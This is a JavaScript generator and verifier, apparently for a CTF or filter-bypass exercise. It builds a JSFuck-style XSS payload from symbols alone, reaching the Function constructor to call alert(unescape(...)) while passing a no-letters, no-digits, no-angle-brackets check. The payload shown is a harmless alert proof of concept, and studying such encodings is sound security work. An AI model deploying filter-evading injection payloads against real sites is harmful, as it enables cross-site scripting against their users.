// JSFuck-ish generator + verifier
var GEVAL = (0,eval);

function ev(src){ return GEVAL(src); }

// number expression builder (payload-safe)
function num(n){
  if(n===0) return "+[]";
  var parts=[];
  for(var i=0;i<n;i++) parts.push("+!+[]");
  return "("+parts.join("+")+")";
}
// sanity
for(var t=0;t<12;t++){ if(ev(num(t))!==t){ print("NUM FAIL "+t+" => "+ev(num(t))); } }

var charMap={};
function addAtom(src){
  var val;
  try{ val = "" + ev(src); }catch(e){ print("EVAL FAIL: "+src+" :: "+e); return; }
  for(var i=0;i<val.length;i++){
    var c=val[i];
    if(!(c in charMap)) charMap[c] = "("+src+")["+num(i)+"]";
  }
  return val;
}

// base atoms (only allowed chars: ![]+{} ~ none alnum)
["![]+[]","!![]+[]","[][[]]+[]","+{}+[]","[]+{}"].forEach(addAtom);

function str(s){
  var parts=[];
  for(var i=0;i<s.length;i++){
    var c=s[i];
    if(!(c in charMap)) { print("MISSING CHAR: ["+c+"] code "+c.charCodeAt(0)); return null; }
    parts.push(charMap[c]);
  }
  if(parts.length===0) return "[]+[]";
  return "("+parts.join("+")+")";
}

// add RegExp ctor toString to obtain 'p' etc
var ctor = str("constructor");
var regexpStr = "(/(?:)/)["+ctor+"]+[]";
addAtom(regexpStr);
print("regexpStr val = " + ev(regexpStr));

// Build F = Function constructor
var filter = str("filter");
var F = "[]["+filter+"]["+ctor+"]";
print("F val = " + ev(F));

function buildCode(){
  var U = "("+F+")("+str("return unescape")+")()";
  var A = "("+F+")("+str("return alert")+")()";
  // percent string: '%' literal + digits coerced from numbers
  function digit(d){ return "(["+num(d)+"]+[])"; }
  var pct = "(('%')+"+digit(5)+"+"+digit(8)+"+('%')+"+digit(5)+"+"+digit(3)+"+('%')+"+digit(5)+"+"+digit(3)+")";
  var xss = "("+U+")("+pct+")";
  var expr = "("+A+")("+xss+")";
  return expr;
}

var expr = buildCode();
print("EXPR = " + expr);
print("payload length = " + expr.length);
print("ALLOWED CHARS ONLY: " + /^[^A-Za-z0-9<>]*$/.test(expr));
print("EVAL RESULT = " + ev(expr));

